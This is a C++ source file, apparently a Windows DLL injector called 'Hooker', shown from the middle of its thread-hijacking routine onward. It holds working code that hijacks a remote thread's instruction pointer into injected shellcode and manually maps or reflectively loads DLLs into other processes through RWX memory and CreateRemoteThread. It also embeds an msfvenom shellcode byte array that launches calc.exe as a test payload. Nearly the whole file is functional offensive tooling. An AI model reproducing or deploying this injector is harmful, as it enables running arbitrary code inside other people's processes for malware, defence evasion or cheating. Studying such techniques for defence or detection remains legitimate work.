    DWORD64 OldRIP = threadContext.Rip;
    *reinterpret_cast<DWORD64*>(BootstrapShellcode + ripOffsetInBootstrap) = OldRIP;

    // Patch the LEA instruction, loading the BootstrapData into rbx
    size_t leaOpcodeOffset = sizeof(BootstrapData) + 0x18; // Start of LEA
    size_t leaOpcodePrefixSize = 0x03;                     // lea(3) XX XX XX XX
    size_t leaOpcodeSize = 0x07;
    size_t leaEndOffset = leaOpcodeOffset + leaOpcodeSize;
    int32_t relativeOffset = (int32_t)(0 - leaEndOffset);  // Target address relative to LEA end (BootstrapData sits at offset 0)
    // Patch the actual displacement (where the 4-byte offset lives)
    *reinterpret_cast<int32_t*>(BootstrapShellcode + leaOpcodeOffset + leaOpcodePrefixSize) = relativeOffset;

    // Initialize arguments inside BootstrapShellcode to point to (future) remote shellcode
    auto* sr_data = reinterpret_cast<BootstrapData*>(BootstrapShellcode); // get the head (start) of the shellcode as SR_REMOTE_DATA struct
    sr_data->pRoutine = (f_Routine)pRemoteRoutine;                        // the DLLium (dll loading) shellcode
    sr_data->pArg = pRemoteArgs;                                          // the required data by DLLium to load the dll

    // Allocate space for bootstrap shellcode and data structure into remote proc
    void* pRemoteBootstrapShellcode = VirtualAllocEx(hProcess, nullptr, sizeof(BootstrapShellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // needs Execute
    if (!pRemoteBootstrapShellcode) {
        printf("[!] Hooker: VirtualAllocEx failed for BootstrapShellcode: %lu\n", GetLastError());
        if (pRemoteRoutine) VirtualFreeEx(hProcess, pRemoteRoutine, 0, MEM_RELEASE);
        return false;
    }
    if (debug)
        printf("[+] Hooker: Allocated memory for BootstrapShellcode at %p in remote process\n", pRemoteBootstrapShellcode);

    // now write the finished BootstrapShellcode to the remote proc
    if (!WriteProcessMemory(hProcess, pRemoteBootstrapShellcode, BootstrapShellcode, sizeof(BootstrapShellcode), nullptr)) {
        ResumeThread(hThread);
        CloseHandle(hThread);
        printf("[!] Hooker: WriteProcessMemory failed for BootstrapShellcode: %lu\n", GetLastError());
        if (pRemoteRoutine) VirtualFreeEx(hProcess, pRemoteRoutine, 0, MEM_RELEASE);
        if (pRemoteBootstrapShellcode) VirtualFreeEx(hProcess, pRemoteBootstrapShellcode, 0, MEM_RELEASE);
        return false;
    }
    if (debug)
        printf("[+] Hooker: Updated pointers in BootstrapShellcode and written it to remote process\n");

    // Redirect the thread's instruction pointer to point to our newly allocated shellcode
    void* pRemoteStartOfBootstrapShellcodeFunc = reinterpret_cast<BYTE*>(pRemoteBootstrapShellcode) + sizeof(BootstrapData);
    threadContext.Rip = reinterpret_cast<ULONG_PTR>(pRemoteStartOfBootstrapShellcodeFunc);

    if (!SetThreadContext(hThread, &threadContext)) {
        ResumeThread(hThread);
        CloseHandle(hThread);
        printf("[!] Hooker: SetThreadContext failed for thread %p: %lu\n", hThread, GetLastError());
        if (pRemoteRoutine) VirtualFreeEx(hProcess, pRemoteRoutine, 0, MEM_RELEASE);
        if (pRemoteBootstrapShellcode) VirtualFreeEx(hProcess, pRemoteBootstrapShellcode, 0, MEM_RELEASE);
        return false;
    }
    if (debug)
        printf("[+] Hooker: SetThreadContext to RemoteStartOfBootstrapShellcodeFunc at %p\n", pRemoteStartOfBootstrapShellcodeFunc);

    // Resume the thread to execute the payload
    ResumeThread(hThread);
    if (debug)
        printf("[+] Hooker: Resumed thread (tid=%i)\n", GetThreadId(hThread));

    // Check the execution state with memread into local bootstrapVerify
    BootstrapData bootstrapVerify{ };
    bootstrapVerify.State = BOOTSTRAP_STATE::Pending;
    bootstrapVerify.Ret = ERROR_SUCCESS;
    bootstrapVerify.LastWin32Error = ERROR_SUCCESS;

    DWORD timer = (DWORD)GetTickCount64();
    DWORD timeout = 60'000; // ms
    DWORD sleepTime = 100; // ms

    while (GetTickCount64() - timer < timeout) {
        Sleep(sleepTime);
        if (!ReadProcessMemory(hProcess, pRemoteBootstrapShellcode, &bootstrapVerify, sizeof(bootstrapVerify), nullptr)) {
            // How dare you?!
            printf("[!] Hooker: Cannot read back memory of injected proc which should never happen but happened, just return\n");
            return true;
        }
        if (bootstrapVerify.State == BOOTSTRAP_STATE::Finished) {
            break;
        }
        // else loop until timeout
    }

    // Output and cleanup 
    switch (bootstrapVerify.State) {
    case BOOTSTRAP_STATE::Pending:
        printf("[-] Hooker: BootstrapShellcode still not called? NANI?!\n"); // cleanup
        if (pRemoteRoutine) VirtualFreeEx(hProcess, pRemoteRoutine, 0, MEM_RELEASE);
        if (pRemoteBootstrapShellcode) VirtualFreeEx(hProcess, pRemoteBootstrapShellcode, 0, MEM_RELEASE);
        return false;
    case BOOTSTRAP_STATE::Executing:
        printf("[+] Hooker: BootstrapShellcode still executing... Let him cook, but I'm out of here.\n"); // no cleanup
        return true;
    case BOOTSTRAP_STATE::Finished:
        if (bootstrapVerify.Ret == 0) {
            printf("[+] Hooker: BootstrapShellcode and supplied routine successfully executed and returned 0. Big Success!\n");
        }
        else {
            printf("[!] Hooker: BootstrapShellcode and supplied routine successfully executed but returned %lu with LastError %lu\n", bootstrapVerify.Ret, bootstrapVerify.LastWin32Error);
        }
        // when finished, do cleanup
        if (pRemoteRoutine) VirtualFreeEx(hProcess, pRemoteRoutine, 0, MEM_RELEASE);
        if (pRemoteBootstrapShellcode) VirtualFreeEx(hProcess, pRemoteBootstrapShellcode, 0, MEM_RELEASE);
        return true;
    default:
        return false;
    }
}

bool HijackThreadTest(HANDLE hProcess, bool debug) {
    BYTE msfvenomExecCalc[] = { 
        0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 
        0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 
        0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 
        0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 
        0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 
        0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 
        0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 
        0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 
        0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 
        0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00 
    }; // this bricks the remote process when returning, what the heli Rapid7?
    
    LPVOID pRemoteRoutine = VirtualAllocEx(hProcess, nullptr, sizeof(msfvenomExecCalc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteRoutine == NULL) {
        return false;
    }

    if (!WriteProcessMemory(hProcess, pRemoteRoutine, msfvenomExecCalc, sizeof(msfvenomExecCalc), nullptr)) {
        VirtualFreeEx(hProcess, pRemoteRoutine, 0, MEM_RELEASE); return false;
    }

    LPVOID pRemoteArg = VirtualAllocEx(hProcess, nullptr, sizeof(void*), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteArg) {
        VirtualFreeEx(hProcess, pRemoteRoutine, 0, MEM_RELEASE); return false;
    }

    return HijackThread(hProcess, pRemoteRoutine, pRemoteArg, debug);
}

// write dll to remote proc and handle patching from external -> minimal remote shellcode to setup
// https://github.com/Paxai/DLLium/blob/de79b82bbeb011778b03022b21c0a9d623f3d813/DLLium/injection.cpp#L161
bool ExternalInject(HANDLE hProcess, const std::string& dllPath, bool debug, bool hijackThread) {

    std::ifstream File(dllPath, std::ios::binary | std::ios::ate);
    if (File.fail()) { printf("[!] Hooker: Open file failed: %lu\n", GetLastError()); return false; }
    if (debug)
        printf("[+] Hooker: Injecting DLL '%s' into remote process\n", dllPath.c_str());

    std::streampos fileSize = File.tellg();
    if (fileSize < 0x1000) { File.close(); return false; }
    if (debug)
        printf("[+] Hooker: DLL size: %llu bytes\n", (unsigned long long)fileSize);

    std::vector<BYTE> pSrcDllData((size_t)fileSize);
    File.seekg(0, std::ios::beg);
    File.read((char*)pSrcDllData.data(), fileSize);
    File.close();
    if (debug)
        printf("[+] Hooker: DLL read into memory\n");

    auto* pLocalDos = reinterpret_cast<IMAGE_DOS_HEADER*>(pSrcDllData.data());
    if (pLocalDos->e_magic != IMAGE_DOS_SIGNATURE) { printf("[!] Unable to find magic bytes in DLL '%s'\n", dllPath.c_str()); return false; }

    auto* pNtLocal = reinterpret_cast<IMAGE_NT_HEADERS*>(pSrcDllData.data() + pLocalDos->e_lfanew);
    if (pNtLocal->Signature != IMAGE_NT_SIGNATURE) { printf("[!] Unable to find NT header signature in DLL '%s'\n", dllPath.c_str()); return false; }
    auto* pOpt = &pNtLocal->OptionalHeader;

    LPVOID pRemoteTargetBase = VirtualAllocEx(hProcess, nullptr, pOpt->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteTargetBase) {
        printf("[!] Hooker: VirtualAllocEx failed at remote process: %lu\n", GetLastError());
        return HandleCleanup(hProcess, {}, nullptr);
    }

    BYTE* pLocalImage = (BYTE*)VirtualAlloc(nullptr, pOpt->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pLocalImage) {
        printf("[!] Hooker: VirtualAlloc failed at local process: %lu\n", GetLastError());
        return HandleCleanup(hProcess, {pRemoteTargetBase}, nullptr);
    }
    if (debug)
        printf("[+] Hooker: Allocated DLL into local %p and remote memory %p\n", pLocalImage, pRemoteTargetBase);

    memcpy(pLocalImage, pSrcDllData.data(), pOpt->SizeOfHeaders);

    auto* pSection = IMAGE_FIRST_SECTION(pNtLocal);
    for (UINT i = 0; i < pNtLocal->FileHeader.NumberOfSections; ++i, ++pSection) {
        if (pSection->SizeOfRawData > 0) {
            memcpy(pLocalImage + pSection->VirtualAddress,
                pSrcDllData.data() + pSection->PointerToRawData,
                pSection->SizeOfRawData);
            if (debug)
                printf("[+] Hooker: Copied section %.8s to local image\n", pSection->Name);
        }
    }

    // get local offsets for relocation 
    auto* pDosHdr = reinterpret_cast<IMAGE_DOS_HEADER*>(pLocalImage);
    auto* rpNt = reinterpret_cast<IMAGE_NT_HEADERS*>(pLocalImage + pDosHdr->e_lfanew);
    auto* rpOpt = &rpNt->OptionalHeader;

    uintptr_t delta = (uintptr_t)pRemoteTargetBase - (uintptr_t)rpOpt->ImageBase;
    if (delta == 0) { printf("[!] Hooker: Delta of 0 between local DLL base and remote process base, no reloc needed\n"); }

    auto relocDir = rpOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir.Size == 0) { printf("[-] Hooker: Empty relocation dir found, no reloc needed\n"); }

    if (delta != 0 && relocDir.Size > 0) {
        auto* pReloc = reinterpret_cast<IMAGE_BASE_RELOCATION*>(pLocalImage + relocDir.VirtualAddress);
        uintptr_t relocEnd = (uintptr_t)pReloc + relocDir.Size;

        // relocate images (known dlls use the same offset over all processes, calculate via local process)
        while (pReloc && (uintptr_t)pReloc < relocEnd && pReloc->SizeOfBlock > sizeof(IMAGE_BASE_RELOCATION)) {
            UINT  count = (pReloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* info = reinterpret_cast<WORD*>(pReloc + 1);

            for (UINT i = 0; i < count; ++i) {
                WORD type = info[i] >> 12;
                WORD offset = info[i] & 0xFFF;

                if (type == IMAGE_REL_BASED_DIR64) {
                    uintptr_t* patch = reinterpret_cast<uintptr_t*>(pLocalImage + pReloc->VirtualAddress + offset);
                    *patch += delta;
                }
                else if (type == IMAGE_REL_BASED_HIGHLOW) {
                    uint32_t* patch = reinterpret_cast<uint32_t*>(pLocalImage + pReloc->VirtualAddress + offset);
                    *patch += (uint32_t)delta;
                }
                else if (type == IMAGE_REL_BASED_ABSOLUTE) {
                    continue; // skip padding
                }
                else {
                    printf("[!] Hooker: Unknown relocation type %d\n", type);
                }
            }

            if (debug)
                printf("[+] Hooker: Processed relocation block at %p\n", pReloc);
            pReloc = reinterpret_cast<IMAGE_BASE_RELOCATION*>(reinterpret_cast<BYTE*>(pReloc) + pReloc->SizeOfBlock);
        }
    }

    // write the image to the remote process, same address
    if (!WriteProcessMemory(hProcess, pRemoteTargetBase, pLocalImage, pOpt->SizeOfImage, nullptr)) {
        printf("[!] Hooker: WriteProcessMemory failed: %lu at remote process\n", GetLastError());
        return HandleCleanup(hProcess, { pRemoteTargetBase }, pLocalImage);
    }
    VirtualFree(pLocalImage, 0, MEM_RELEASE);
    pLocalImage = nullptr;
    if (debug)
        printf("[+] Hooker: Wrote DLL to remote process memory at %p\n", pRemoteTargetBase);

    HMODULE hK32Local = GetModuleHandleA("kernel32.dll");
    if (!hK32Local) {
        printf("[!] Hooker: GetModuleHandleA failed for kernel32.dll at local process: %lu\n", GetLastError());
        return HandleCleanup(hProcess, { pRemoteTargetBase }, pLocalImage);
    }

    // get address of setup functions
    auto pRtlAddFuncTableLocal = (f_RtlAddFunctionTable)GetProcAddress(hK32Local, "RtlAddFunctionTable");
    auto pLoadLibraryALocal = (f_LoadLibraryA)GetProcAddress(hK32Local, "LoadLibraryA");
    auto pGetProcAddressLocal = (f_GetProcAddress)GetProcAddress(hK32Local, "GetProcAddress");

    if (!pLoadLibraryALocal || !pGetProcAddressLocal) {
        printf("[!] Hooker: GetProcAddress failed for LoadLibraryA or GetProcAddress at local process: %lu\n", GetLastError());
        return HandleCleanup(hProcess, { pRemoteTargetBase }, pLocalImage);
    }
    if (debug)
        printf("[+] Hooker: Resolved LoadLibraryA, GetProcAddress, and RtlAddFunctionTable at local process\n");

    ShellcodeData dllLoadingData = {};
    dllLoadingData.pDllBase = (uintptr_t)pRemoteTargetBase;
    dllLoadingData.EntryPoint = pOpt->AddressOfEntryPoint;
    dllLoadingData.ImportDir = pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    dllLoadingData.RelocDir = pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    dllLoadingData.ExceptionDir = pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
    dllLoadingData.ExceptionSize = pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;
    dllLoadingData.TLSDir = pOpt->DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
    dllLoadingData.pLoadLibraryA = pLoadLibraryALocal;
    dllLoadingData.pGetProcAddress = pGetProcAddressLocal;
    dllLoadingData.pRtlAddFunctionTable = pRtlAddFuncTableLocal;

    // allocate memory for shellcode data in remote process
    LPVOID pRemoteDllLoadingData = VirtualAllocEx(hProcess, nullptr, sizeof(ShellcodeData), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteDllLoadingData) {
        printf("[!] Hooker: VirtualAllocEx failed for dllLoadingData: %lu\n", GetLastError());
        return HandleCleanup(hProcess, { pRemoteTargetBase }, pLocalImage);
    }
    WriteProcessMemory(hProcess, pRemoteDllLoadingData, &dllLoadingData, sizeof(ShellcodeData), nullptr);
    if (debug)
        printf("[+] Hooker: Wrote required dllLoadingData to remote process memory at %p\n", pRemoteDllLoadingData);

    size_t dllLoadingShellcodeSize = GetUniversalShellcodeSize(); // now with fancy code sections
    const void* pLocalDllLoadingShellcodeStart = ResolveFunction((void*)UniversalDllLoadingShellcode);

    // sanity check on the shellcodeSize, just set to 4kB if non-sensical and hope
    if (dllLoadingShellcodeSize == 0 || dllLoadingShellcodeSize > 0x8000) {
        printf("[-] Hooker: Warning, dllLoadingShellcodeSize has strange size %llu\n", dllLoadingShellcodeSize);
        dllLoadingShellcodeSize = 0x1000;
    }

    // alloc space for the DLLium (DLL loading shellcode) in remote proc
    LPVOID pRemoteDllLoadingShellcode = VirtualAllocEx(hProcess, nullptr, dllLoadingShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // needs Execute
    if (!pRemoteDllLoadingShellcode) {
        printf("[!] Hooker: VirtualAllocEx failed for remote dll loading shellcode: %lu\n", GetLastError());
        return HandleCleanup(hProcess, { pRemoteDllLoadingData }, nullptr);
    }

    // write the DLLium (DLL loading shellcode) to remote proc
    if (!WriteProcessMemory(hProcess, pRemoteDllLoadingShellcode, pLocalDllLoadingShellcodeStart, dllLoadingShellcodeSize, nullptr)) {
        printf("[!] Hooker WriteProcessMemory failed for remote dll loading shellcode: %lu\n", GetLastError());
        return HandleCleanup(hProcess, { pRemoteDllLoadingData, pRemoteDllLoadingShellcode }, nullptr);
    }
    if (debug)
        printf("[+] Hooker: Wrote dll loading shellcode to remote process memory at %p, size: %zu bytes\n", pRemoteDllLoadingShellcode, dllLoadingShellcodeSize);

    bool ret = false;

    // https://github.com/guidedhacking/GuidedHacking-Injector/blob/e3c6eab04943b10881a7039dc27ff964c79fcb64/GH%20Injector%20Library/Thread%20Hijacking.cpp#L10
    if (hijackThread) {
        bool ret = HijackThread(hProcess, pRemoteDllLoadingShellcode, pRemoteDllLoadingData, debug);
        HandleCleanup(hProcess, { pRemoteDllLoadingData, pRemoteTargetBase }, pLocalImage);
        return ret;
    }
    else {
        
        // and run it
        HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pRemoteDllLoadingShellcode, pRemoteDllLoadingData, 0, nullptr);
        if (!hThread) {
            printf("[!] Hooker: CreateRemoteThread failed: %lu\n", GetLastError());
            return HandleCleanup(hProcess, { pRemoteDllLoadingData, pRemoteDllLoadingShellcode }, nullptr);
        }

        printf("[+] Hooker: Remote thread created\n");

        if (hThread) {
            WaitForSingleObject(hThread, INFINITE);
            CloseHandle(hThread);
        }
        CloseHandle(hProcess);

        if (debug)
            printf("[+] Hooker: DllMain successfully exited\n");

        ret = true;
    }

    return ret;
}

// write dll to remote proc and call self-reflective loader (handles image address, system function resol., mem alloc, header copy, section copy, IAT resolution, relocations, and call DllMain)
bool ReflectiveInject(HANDLE hProcess, const std::string& dllPath, bool debug) {
    // open dll file
    HANDLE file_handle = CreateFileA(dllPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file_handle == INVALID_HANDLE_VALUE) { printf("[!] Hooker: CreateFile failed: %lu\n", GetLastError()); return false; }
    if (debug)
        printf("[+] Hooker: Injecting DLL '%s' into remote process\n", dllPath.c_str());

    // get file size
    LARGE_INTEGER fileSize = { 0 };
    if (!GetFileSizeEx(file_handle, &fileSize)) { printf("[!] Hooker: GetFileSizeEx failed: %lu\n", GetLastError()); CloseHandle(file_handle); return false; }
    SIZE_T sz = (SIZE_T)fileSize.QuadPart;
    if (sz == 0) { printf("[!] Hooker: Empty file\n"); CloseHandle(file_handle); return false; }
    if (debug)
        printf("[+] Hooker: DLL size: %llu bytes\n", (unsigned long long)sz);

    // allocate buffer and read
    LPBYTE file_buf = (LPBYTE)HeapAlloc(GetProcessHeap(), 0, sz);
    if (!file_buf) { printf("[!] Hooker: HeapAlloc failed\n"); CloseHandle(file_handle); return false; }
    DWORD bytesRead = 0;
    if (!ReadFile(file_handle, file_buf, (DWORD)sz, &bytesRead, NULL) || bytesRead != (DWORD)sz) {
        printf("[!] Hooker: ReadFile failed or incomplete: %lu bytesRead=%lu\n", GetLastError(), bytesRead);
        HeapFree(GetProcessHeap(), 0, file_buf); CloseHandle(file_handle); return false;
    }
    CloseHandle(file_handle);
    if (debug)
        printf("[+] Hooker: DLL read into memory\n");

    // find reflective loader offset in raw file
    DWORD64 reflective_loader_offset = GetReflectiveLoaderOffset((DWORD64)file_buf, "ReflectiveLoader");
    if (!reflective_loader_offset) { printf("[!] Hooker: ReflectiveLoader export not found in %s\n", dllPath.c_str()); HeapFree(GetProcessHeap(), 0, file_buf); return false; }
    if (debug)
        printf("[+] Hooker: ReflectiveLoader offset at 0x%llu\n", reflective_loader_offset);

    // allocate remote memory (use the file size)
    LPVOID remote_file_buf_address = VirtualAllocEx(hProcess, NULL, sz, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!remote_file_buf_address) { printf("[!] Hooker: VirtualAllocEx failed in remote proc: %lu\n", GetLastError()); CloseHandle(hProcess); HeapFree(GetProcessHeap(), 0, file_buf); return false; }
    if (debug)
        printf("[+] Hooker: Remote memory allocated at 0x%p\n", remote_file_buf_address);

    // write file into remote process
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, remote_file_buf_address, file_buf, sz, (SIZE_T*)&written) || written != sz) {
        printf("[!] Hooker: WriteProcessMemory failed: %lu written=%llu\n", GetLastError(), (unsigned long long)written);
        VirtualFreeEx(hProcess, remote_file_buf_address, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        HeapFree(GetProcessHeap(), 0, file_buf);
        return false;
    }
    if (debug)
        printf("[+] Hooker: DLL written into remote process memory\n");

    // make memory executable
    DWORD oldProt = 0;
    if (!VirtualProtectEx(hProcess, remote_file_buf_address, sz, PAGE_EXECUTE_READ, &oldProt)) {
        // If this fails, try PAGE_EXECUTE_READWRITE (some targets)
        if (!VirtualProtectEx(hProcess, remote_file_buf_address, sz, PAGE_EXECUTE_READWRITE, &oldProt)) {
            printf("[!] Hooker: VirtualProtectEx to RWX failed: %lu\n", GetLastError());
            VirtualFreeEx(hProcess, remote_file_buf_address, 0, MEM_RELEASE);
            CloseHandle(hProcess);
            HeapFree(GetProcessHeap(), 0, file_buf);
            return false;
        }
        if (debug)
            printf("[+] Hooker: Remote memory protection changed to RWX\n");
    }
    if (debug)
        printf("[+] Hooker: Remote memory protection changed to RX\n");

    // compute remote address of reflective loader and create remote thread
    LPTHREAD_START_ROUTINE remote_start = (LPTHREAD_START_ROUTINE)((ULONG_PTR)remote_file_buf_address + (ULONG_PTR)reflective_loader_offset);

    HANDLE thread_handle = CreateRemoteThread(hProcess, NULL, 0, remote_start, NULL, 0, NULL);
    if (!thread_handle) { printf("[!] Hooker: CreateRemoteThread failed: %lu\n", GetLastError()); VirtualFreeEx(hProcess, remote_file_buf_address, 0, MEM_RELEASE); CloseHandle(hProcess); HeapFree(GetProcessHeap(), 0, file_buf); return false; }
    if (debug)
        printf("[+] Hooker: Remote thread created\n");

    WaitForSingleObject(thread_handle, INFINITE);
    CloseHandle(thread_handle);
    CloseHandle(hProcess);
    HeapFree(GetProcessHeap(), 0, file_buf);

    if (debug)
        printf("[+] Hooker: DllMain successfully exited\n");
    return true;
}

// Preparation for DLL injection
bool InjectDll(int pid, const std::string& dllPath, bool debug, Action a, HANDLE hProcess, bool hijackThread) {
    if (hProcess == NULL) {
        if (debug) {
            printf("[+] Hooker: Opening pid=%i\n", pid);
        }
        hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    }
    else {
        if (debug) {
            printf("[+] Hooker: Using existing handle=%p\n", hProcess);
        }
    }

    if (!hProcess) {
        std::cerr << "[!] Hooker: Failed to open target process. Error: " << GetLastError() << "\n";
        return false;
    }
    BOOL isWow = FALSE;
    if (IsWow64Process(hProcess, &isWow)) {
        if (isWow) {
            std::cerr << "[!] Hooker: Target process is 32-bit, but this injector is 64-bit. Cannot inject.\n";
            CloseHandle(hProcess);
            return false;
        }
    }
    else {
        std::cerr << "[!] Hooker: IsWow64Process failed. Error: " << GetLastError() << "\n";
        CloseHandle(hProcess);
        return false;
    }
    PrintGrantedAccess(hProcess, pid);

    switch (a) {
    case LOADLIBRARY_INJECTION:
        if (debug) {
            std::cout << "[*] Hooker: Using LoadLibrary injection\n";
        }
        return LoadLibraryInject(hProcess, dllPath, debug);
    case EXTERNAL_INJECTION:
        if (debug) {
            std::cout << "[*] Hooker: Using External injection\n";
        }
        return ExternalInject(hProcess, dllPath, debug, hijackThread);
    case REFLECTIVE_INJECTION:
        if (debug) {
            std::cout << "[*] Hooker: Using Reflective injection\n";
        }
        return ReflectiveInject(hProcess, dllPath, debug);
    case HIJACK_THREAD_TEST:
        if (debug) {
            std::cout << "[*] Hooker: Testing hijackThread()\n";
        }
        return HijackThreadTest(hProcess, debug);
    default:
        std::cerr << "[!] Hooker: Unknown action\n";
        CloseHandle(hProcess);
        return false;
    }
}
